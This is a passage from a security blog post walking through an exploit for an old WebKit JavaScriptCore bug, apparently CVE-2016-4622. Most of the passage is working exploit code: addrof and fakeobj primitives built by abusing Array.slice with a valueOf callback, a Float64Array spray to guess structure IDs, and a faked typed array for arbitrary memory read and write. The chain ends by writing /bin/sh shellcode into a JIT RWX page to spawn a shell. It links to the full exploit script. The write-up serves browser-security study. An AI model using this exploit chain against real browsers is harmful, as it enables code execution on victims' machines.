</span></span><span style="display:flex;"><span>3735928559,0.1337,abcd,true,<span style="color:#f92672">[</span>object Object<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>&gt;&gt;&gt; describe<span style="color:#f92672">(</span>a<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Object: 0x7fffadfc4340 with butterfly 0x7fffadde4108 <span style="color:#f92672">(</span>0x7fffadff3360:<span style="color:#f92672">[</span>Array, <span style="color:#f92672">{}</span>, ArrayWithContiguous, Proto:0x7fffadfd0120<span style="color:#f92672">])</span>, ID: <span style="color:#ae81ff">87</span>
</span></span></code></pre></div><p>Here is how a butterfly is represented in memory:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>pwndbg&gt; x/16gx 0x7fffadde4108
</span></span><span style="display:flex;"><span>0x7fffadde4108: 0x41ecd5b7dde00000      0x3fc21d14e3bcd35b
</span></span><span style="display:flex;"><span>0x7fffadde4118: 0x00007fffadf94360      0x0000000000000007
</span></span><span style="display:flex;"><span>0x7fffadde4128: 0x00007fffadffc1e0      0x00000000badbeef0
</span></span><span style="display:flex;"><span>0x7fffadde4138: 0x00000000badbeef0      0x00000000badbeef0
</span></span></code></pre></div><h2 id="exploit-strategy">Exploit Strategy
</h2><ul>
<li>
<p>First, we start with writing our exploit primitives addrof and fakeobj.</p>
</li>
<li>
<p>For addrof, We make use of an array of doubles, which will have its indexing type as ArrayWithDoubles. and use the valueof function to shrink the array, allocate an array with the object, and return a size larger than the array size which will access the object. slice preserves the indexing type, and the data we access is treated as native doubles which gives us JSValue leak which is in the form of 64bit Floating point value. fakeobj follows a similar approach but the other way around.</p>
</li>
<li>
<p>addrof primitive</p>
</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">addrof</span>(<span style="color:#a6e22e">object</span>) {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">a</span> <span style="color:#f92672">=</span> [];
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">100</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>) <span style="color:#a6e22e">a</span>.<span style="color:#a6e22e">push</span>(<span style="color:#a6e22e">i</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0.123</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">b</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">a</span>.<span style="color:#a6e22e">slice</span>(<span style="color:#ae81ff">0</span>, {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">valueOf</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">function</span> () {
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">a</span>.<span style="color:#a6e22e">length</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">b</span> <span style="color:#f92672">=</span> [<span style="color:#a6e22e">object</span>];
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">5</span>;
</span></span><span style="display:flex;"><span>    },
</span></span><span style="display:flex;"><span>  });
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">Int64</span>.<span style="color:#a6e22e">fromDouble</span>(<span style="color:#a6e22e">b</span>[<span style="color:#ae81ff">4</span>]);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><ul>
<li>fakeobj primitive</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span>  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">fakeobj</span>(<span style="color:#a6e22e">addr</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">a</span> <span style="color:#f92672">=</span> [];
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">100</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>) <span style="color:#a6e22e">a</span>.<span style="color:#a6e22e">push</span>({});
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">b</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">a</span>.<span style="color:#a6e22e">slice</span>(<span style="color:#ae81ff">0</span>, {
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">valueOf</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">function</span> () {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">a</span>.<span style="color:#a6e22e">length</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">b</span> <span style="color:#f92672">=</span> [<span style="color:#a6e22e">addr</span>.<span style="color:#a6e22e">asDouble</span>()];
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">5</span>;
</span></span><span style="display:flex;"><span>      },
</span></span><span style="display:flex;"><span>    });
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">b</span>[<span style="color:#ae81ff">4</span>];
</span></span><span style="display:flex;"><span>  } <span style="color:#e6db74">```
</span></span></span></code></pre></div><ul>
<li>Now we will aim to achieve arb read/write, we achieve this using a fake Float64Array Instance.</li>
</ul>
<p>Why Float64Array?
Typed Arrays store raw binary data, we can get arbitrary read/write if we control the data pointer.</p>
<p>Ok, Before we proceed further, To fake an object, We need a valid JSCell header and JS StructureID which is not static. In this case, We can predict a valid structure id by spraying a lot of objects and adding a different property each time which gives us a unique structure id.</p>
<ul>
<li>We now spray a lot of Float64Array instances and guess the structure id. we can check if the guess is correct using <code>instanceof</code>.</li>
<li>After setting up the cell header of fake Float64Array, We make the vector ptr ( pointer to the backing memory ) of the fake object point to another array, which gives us arb read/write.</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">spray</span>() {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">10000</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">a</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Float64Array</span>(<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">elem</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;aaa&#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">i</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">a</span>[<span style="color:#a6e22e">elem</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xdeadbeef</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">spray</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">temp</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Uint8Array</span>(<span style="color:#ae81ff">1000</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">/* JS cell header for a Float64Array
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> m_structureID
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> m_indexingType
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> m_type
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> m_flags
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> m_cellState
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> */</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">jsCellHeader</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Int64</span>([
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x0</span>,<span style="color:#ae81ff">0x10</span>,<span style="color:#ae81ff">0x0</span>,<span style="color:#ae81ff">0x0</span>, 
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x0</span>, 
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x2c</span>, 
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x08</span>, 
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x1</span>, 
</span></span><span style="display:flex;"><span>]);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">container</span> <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">jsCellHeader</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">jsCellHeader</span>.<span style="color:#a6e22e">asJSValue</span>(),
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">butterfly</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">false</span>, <span style="color:#75715e">// Can&#39;t use 0x0 here because of conversion to JSValue, so we use false
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#a6e22e">vector</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">temp</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">lengthAndFlags</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Int64</span>(<span style="color:#e6db74">&#34;0x0001000000000100&#34;</span>).<span style="color:#a6e22e">asJSValue</span>(),
</span></span><span style="display:flex;"><span>};
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">memory</span> <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">read</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">addr</span>, <span style="color:#a6e22e">length</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fakearray</span>[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">addr</span>.<span style="color:#a6e22e">asDouble</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">res</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Array(<span style="color:#a6e22e">length</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">length</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>) <span style="color:#a6e22e">res</span>[<span style="color:#a6e22e">i</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">temp</span>[<span style="color:#a6e22e">i</span>];
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>;
</span></span><span style="display:flex;"><span>  },
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">write</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">addr</span>, <span style="color:#a6e22e">data</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fakearray</span>[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">addr</span>.<span style="color:#a6e22e">asDouble</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">data</span>.<span style="color:#a6e22e">length</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>) <span style="color:#a6e22e">temp</span>[<span style="color:#a6e22e">i</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">data</span>[<span style="color:#a6e22e">i</span>];
</span></span><span style="display:flex;"><span>  },
</span></span></code></pre></div><ul>
<li>The butterfly of the fake object is an invalid pointer, this causes a crash because of the garbage collector. we fix the fake object and the container to avoid a crash.</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">empty</span> <span style="color:#f92672">=</span> {};
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">header</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">memory</span>.<span style="color:#a6e22e">read</span>(<span style="color:#a6e22e">addrof</span>(<span style="color:#a6e22e">empty</span>), <span style="color:#ae81ff">8</span>);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">memory</span>.<span style="color:#a6e22e">write</span>(<span style="color:#a6e22e">addrof</span>(<span style="color:#a6e22e">container</span>), <span style="color:#a6e22e">header</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">arr</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Float64Array</span>(<span style="color:#ae81ff">8</span>);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">header</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">memory</span>.<span style="color:#a6e22e">read</span>(<span style="color:#a6e22e">addrof</span>(<span style="color:#a6e22e">arr</span>), <span style="color:#ae81ff">16</span>);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">length</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">memory</span>.<span style="color:#a6e22e">read</span>(<span style="color:#a6e22e">Add</span>(<span style="color:#a6e22e">addrof</span>(<span style="color:#a6e22e">arr</span>), <span style="color:#ae81ff">24</span>), <span style="color:#ae81ff">8</span>);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">memory</span>.<span style="color:#a6e22e">write</span>(<span style="color:#a6e22e">addrof</span>(<span style="color:#a6e22e">fakearray</span>), <span style="color:#a6e22e">header</span>);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">memory</span>.<span style="color:#a6e22e">write</span>(<span style="color:#a6e22e">Add</span>(<span style="color:#a6e22e">addrof</span>(<span style="color:#a6e22e">fakearray</span>), <span style="color:#ae81ff">24</span>), <span style="color:#a6e22e">length</span>);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fakearray</span>.<span style="color:#a6e22e">container</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">container</span>;
</span></span></code></pre></div><ul>
<li>We now create a JITed region that has RWX permissions, and get the address of that region using the primitives.</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">jit_funx</span>() {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">target</span>(<span style="color:#a6e22e">x</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">x</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">1000</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">target</span>(<span style="color:#a6e22e">i</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">target</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// 
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">pwn</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">jit_funx</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">pwn_addr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">addrof</span>(<span style="color:#a6e22e">pwn</span>);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">rwx_addr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">memory</span>.<span style="color:#a6e22e">read64</span>(<span style="color:#a6e22e">Add</span>(<span style="color:#a6e22e">pwn_addr</span>, <span style="color:#ae81ff">24</span>));
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">jitCodeAddr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">memory</span>.<span style="color:#a6e22e">read64</span>(<span style="color:#a6e22e">Add</span>(<span style="color:#a6e22e">rwx_addr</span>, <span style="color:#ae81ff">24</span>));
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">shellcode</span> <span style="color:#f92672">=</span> [
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x31</span>, <span style="color:#ae81ff">0xc0</span>, <span style="color:#ae81ff">0x50</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0xbf</span>, <span style="color:#ae81ff">0x2f</span>, <span style="color:#ae81ff">0x62</span>, <span style="color:#ae81ff">0x69</span>, <span style="color:#ae81ff">0x6e</span>, <span style="color:#ae81ff">0x2f</span>, <span style="color:#ae81ff">0x2f</span>, <span style="color:#ae81ff">0x73</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x68</span>, <span style="color:#ae81ff">0x57</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x89</span>, <span style="color:#ae81ff">0xe7</span>, <span style="color:#ae81ff">0x50</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x89</span>, <span style="color:#ae81ff">0xe2</span>, <span style="color:#ae81ff">0x57</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x89</span>, <span style="color:#ae81ff">0xe6</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0xb0</span>, <span style="color:#ae81ff">0x3b</span>, <span style="color:#ae81ff">0x0f</span>, <span style="color:#ae81ff">0x05</span>,
</span></span><span style="display:flex;"><span>];
</span></span></code></pre></div><ul>
<li>Using the leak, write the shellcode to that address and then call the function.</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">code</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">memory</span>.<span style="color:#a6e22e">read64</span>(<span style="color:#a6e22e">Add</span>(<span style="color:#a6e22e">jitCodeAddr</span>, <span style="color:#ae81ff">32</span>));
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">memory</span>.<span style="color:#a6e22e">write</span>(<span style="color:#a6e22e">code</span>, <span style="color:#a6e22e">shellcode</span>);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">pwn</span>();
</span></span></code></pre></div><ul>
<li>This will execute the shellcode and pop a shell.
<img src="https://i.imgur.com/4Ebofqm.gif"
	
	
	
	loading="lazy"
	
	
></li>
</ul>
<p>Here is the <a class="link" href="https://github.com/SanjayVardhan/browser-pwn/tree/main/webkit/CVEs/CVE-2016-4622"  target="_blank" rel="noopener"
    >link</a> for the exploit script.</p>

</section>


    <footer class="article-footer">
    
    <section class="article-tags">
        
            <a href="/tags/webkit/">WebKit</a>
        
            <a href="/tags/browser/">Browser</a>
        
            <a href="/tags/cve/">CVE</a>
        
            <a href="/tags/exploitation/">Exploitation</a>
        
    </section>


    </footer>


    
</article>

    

    

     
    

    <footer class="site-footer">
    <section class="copyright">
        &copy; 
        
            2024 - 
        
        2025 spektre&#39;s Blog
    </section>
    
    <section class="powerby">
        
            ¬© 2025 spektre. All rights reserved. <br/>
        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
    </section>
</footer>


    
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    
    <div class="pswp__bg"></div>

    
    <div class="pswp__scroll-wrap">

        
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                
                
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
                defer
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
                defer
                >
            </script><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
            ><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
            >

            </main>
        </div>
        <script 
                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
                
                >
            </script><script type="text/javascript" src="/ts/main.c4c6f77d20c3a4b8c34274cb3cea4603317114a7a5df549091aa546fa8b95e16.js" defer></script>
<script>
    (function () {
        const customFont = document.createElement('link');
        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";

        customFont.type = "text/css";
        customFont.rel = "stylesheet";

        document.head.appendChild(customFont);
    }());
</script>

    </body>
</html>
